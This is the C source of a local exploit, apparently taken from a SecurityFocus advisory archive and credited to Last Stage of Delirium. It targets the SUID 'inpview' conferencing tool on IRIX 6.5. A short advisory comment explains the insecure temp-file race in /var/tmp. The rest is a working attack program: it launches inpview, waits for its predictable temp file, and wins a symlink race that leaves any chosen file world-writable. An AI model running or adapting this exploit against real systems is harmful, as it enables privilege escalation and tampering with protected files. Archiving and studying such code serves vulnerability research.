/*
source: http://www.securityfocus.com/bid/1530/info

Certain versions of IRIX ship with a version of inpview that creates files in '/var/tmp/' in an insecure manner and is therefore prone to a race condition.

InPerson's 'inpview' is a networked multimedia conferencing tool. InPerson provides multiway audio and video conferencing with a shared whiteboard, combined into a single, easy-to-use application. You use a separate "phone" tool to place and answer calls.

The 'inpview' program writes out temporary files in the '/var/tmp' directory. Because these filenames are not random, an attacker can create a symlink to a previously created filename and force the SUID 'inpview' to overwrite the file with 'rw-rw-rw' permissions. 
*/

/*## copyright LAST STAGE OF DELIRIUM jan 2000 poland        *://lsd-pl.net/ #*/
/*## /usr/lib/InPerson/inpview                                               #*/

/*   sets rw-rw-rw permissions                                                */

#include <sys/types.h>
#include <dirent.h>
#include <stdio.h>

main(int argc,char **argv){
    DIR *dirp;struct dirent *dentp;

    printf("copyright LAST STAGE OF DELIRIUM jan 2000 poland  //lsd-pl.net/\n");
    printf("/usr/lib/InPerson/inpview for irix 6.5 6.5.8 IP:all\n\n");

    if(argc!=2){
        printf("usage: %s file\n",argv[0]);
        exit(-1);
    }

    if(!fork()){
        nice(-20);sleep(2);close(0);close(1);close(2);
        execle("/usr/lib/InPerson/inpview","lsd",0,0);
    }

    printf("looking for temporary file... ");fflush(stdout);
    chdir("/var/tmp");
    dirp=opendir(".");
    while(1){
        if((dentp=readdir(dirp))==NULL) {rewinddir(dirp);continue;}
        if(!strncmp(dentp->d_name,".ilmpAAA",8)) break; 
    }
    closedir(dirp);
    printf("found!\n");
    while(1){
        if(!symlink(argv[1],dentp->d_name)) break;
    }
    sleep(2);
    unlink(dentp->d_name);

    execl("/bin/ls","ls","-l",argv[1],0);
}